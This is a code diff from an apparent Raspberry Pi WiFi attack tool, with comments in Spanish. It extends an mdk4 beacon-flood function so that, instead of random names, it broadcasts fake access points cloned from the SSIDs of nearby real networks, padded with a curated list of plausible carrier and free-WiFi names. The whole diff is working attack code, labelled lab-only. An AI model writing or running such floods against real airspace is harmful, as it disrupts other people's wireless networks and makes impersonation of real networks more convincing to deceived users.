@@ -372,30 +372,90 @@ def _mdk4_path():
             return p
     return "/usr/sbin/mdk4"
 
-def beacon_flood(iface, channel=6, seconds=20, pps=80):
-    """Beacon flood con mdk4 (modo 'b'): inunda el aire con APs falsos de SSID
-    aleatorio durante `seconds`. Demo de ruido / saturacion de listas WiFi
-    (SOLO laboratorio). mdk4 necesita la interfaz en MONITOR (no la setea el
-    solo), por eso reset->monitor->flood->managed como el resto. El ataque es
-    continuo; lo acotamos con `timeout` (mdk4 sale por SIGTERM, returncode != 0
-    es ESPERADO, no un error)."""
+def _beacon_ssid_file(iface):
+    """Arma un archivo de SSIDs 'reales' para el beacon flood, en vez de los
+    nombres random de mdk4. Fuentes, en orden:
+      1) CLONA el entorno: un scan rapido en managed y toma los SSIDs vistos
+         (lo mas creible: floodea copias de las redes reales de alrededor).
+      2) Agrega una lista curada del repo (data/beacon_ssids.txt): nombres
+         plausibles tipo 'Movistar_Fibra', 'FREE_WiFi', etc.
+    Devuelve (ruta_tmp, n_ssids) o (None, 0) si no junto ninguno (mdk4 usa
+    random). Se corre ANTES de pasar a monitor (el scan necesita managed)."""
+    ssids = []
+    try:
+        proc = subprocess.run(['sudo', '/usr/sbin/iw', 'dev', iface, 'scan'],
+                              capture_output=True, text=True, timeout=15)
+        if proc.returncode == 0:
+            for line in proc.stdout.splitlines():
+                line = line.strip()
+                if line.startswith('SSID:'):
+                    s = line.split('SSID:', 1)[1].strip()
+                    if s and s not in ssids:
+                        ssids.append(s)
+    except Exception:
+        pass
+
+    curated = os.path.expanduser("~/piscanlvgl/data/beacon_ssids.txt")
+    if os.path.exists(curated):
+        try:
+            with open(curated, errors="replace") as f:
+                for line in f:
+                    s = line.strip()
+                    if s and not s.startswith('#') and s not in ssids:
+                        ssids.append(s)
+        except Exception:
+            pass
+
+    if not ssids:
+        return None, 0
+    try:
+        tmp = tempfile.NamedTemporaryFile(mode='w', prefix='piscan_beacon_',
+                                          suffix='.txt', delete=False)
+        for s in ssids[:200]:
+            tmp.write(s + "\n")
+        tmp.close()
+        return tmp.name, len(ssids[:200])
+    except Exception:
+        return None, 0
+
+def beacon_flood(iface, channel=6, seconds=20, pps=80, realistic=True):
+    """Beacon flood con mdk4 (modo 'b'): inunda el aire con APs falsos durante
+    `seconds` (SOLO laboratorio). Con realistic=True usa nombres CREIBLES
+    (clon del entorno + lista curada) via `mdk4 -f <archivo>`, en vez de los
+    SSID random. mdk4 necesita la interfaz en MONITOR (no la setea el solo),
+    por eso reset->monitor->flood->managed. El ataque es continuo; lo acotamos
+    con `timeout` (mdk4 sale por SIGTERM: returncode != 0 es ESPERADO)."""
+    ssid_file, n_ssids = (None, 0)
+    if realistic:
+        disable_monitor(iface)           # managed para poder escanear el entorno
+        ssid_file, n_ssids = _beacon_ssid_file(iface)
+
     ok = enable_monitor(iface)
     if not ok:
+        if ssid_file:
+            try: os.remove(ssid_file)
+            except Exception: pass
         return None, f"No se pudo activar modo monitor (estado: {get_status(iface)})"
 
-    # Canal fijo para que el flood sea visible en ese canal (mdk4 -c tambien lo
-    # fija; lo seteamos antes por las dudas). No critico si falla.
+    # Canal fijo para que el flood sea visible ahi (mdk4 -c tambien lo fija).
     _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'set', 'channel', str(channel)])
     time.sleep(0.5)
 
     mdk4 = _mdk4_path()
-    r = _run(['sudo', '/usr/bin/timeout', str(seconds),
-              mdk4, iface, 'b', '-c', str(channel), '-s', str(pps)],
-             timeout=seconds + 8)
+    cmd = ['sudo', '/usr/bin/timeout', str(seconds),
+           mdk4, iface, 'b', '-c', str(channel), '-s', str(pps)]
+    if ssid_file:
+        cmd += ['-f', ssid_file]         # SSIDs del archivo en vez de random
+    r = _run(cmd, timeout=seconds + 8)
     out = ((r.stdout or '') + (r.stderr or '')) if r else ''
 
     disable_monitor(iface)
+    if ssid_file:
+        try: os.remove(ssid_file)
+        except Exception: pass
+
     return {"seconds": seconds, "channel": channel, "pps": pps,
+            "ssids": n_ssids, "realistic": bool(ssid_file),
             "detail": out[-400:]}, None
 
 
